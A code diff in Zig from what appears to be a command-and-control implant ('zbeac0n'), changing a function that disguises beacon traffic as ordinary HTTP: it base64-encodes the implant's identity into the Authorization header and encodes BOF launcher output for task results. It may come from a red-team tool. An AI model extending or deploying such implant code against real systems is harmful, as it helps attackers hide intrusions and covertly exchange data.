@@ -261,17 +261,25 @@ fn netHttpMasquerade(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionTyp
     //
     // Implement transforms based on type of the current connection
     //
+    const b64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
+
     if (connectionType == zbeac0n.netConnectionType.Heartbeat) {
 
-        // header transforms: implantID -> HTTP authorization header
+        // header transforms: base64(implantID) -> HTTP authorization header
+        const implant_identity_b64 = try s.allocator.alloc(u8, b64_encoder.calcSize(s.implant_identity.len));
+        _ = std.base64.Base64Encoder.encode(&b64_encoder, implant_identity_b64, s.implant_identity);
+
         http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
-            .override = s.implant_identity,
+            .override = implant_identity_b64,
         };
     } else if (connectionType == zbeac0n.netConnectionType.ResourceFetch) {
 
-        // header transforms: implantID -> HTTP authorization header
+        // header transforms: base64(implantID) -> HTTP authorization header
+        const implant_identity_b64 = try s.allocator.alloc(u8, b64_encoder.calcSize(s.implant_identity.len));
+        _ = std.base64.Base64Encoder.encode(&b64_encoder, implant_identity_b64, s.implant_identity);
+
         http_reqOptions.headers.authorization = std.http.Client.Request.Headers.Value{
-            .override = s.implant_identity,
+            .override = implant_identity_b64,
         };
     } else if (connectionType == zbeac0n.netConnectionType.TaskResult) {
 
@@ -297,12 +305,12 @@ fn netHttpMasquerade(s: *zbeac0n.State, connectionType: zbeac0n.netConnectionTyp
 
         // data / body transforms: base64(body)
         if (bof_res.?.output != null) {
-            const new_body_len = s.base64_encoder.calcSize(bof_res.?.len);
+            const new_body_len = b64_encoder.calcSize(bof_res.?.len);
             const out_b64 = try s.allocator.alloc(u8, new_body_len);
             errdefer s.allocator.free(out_b64);
 
             const body = @as([*]u8, @ptrCast(@constCast(bof_res.?.output)))[0..bof_res.?.len];
-            _ = s.base64_encoder.encode(out_b64, body);
+            _ = b64_encoder.encode(out_b64, body);
 
             std.log.info("Bof launcher output (base64): {s}", .{out_b64});
 
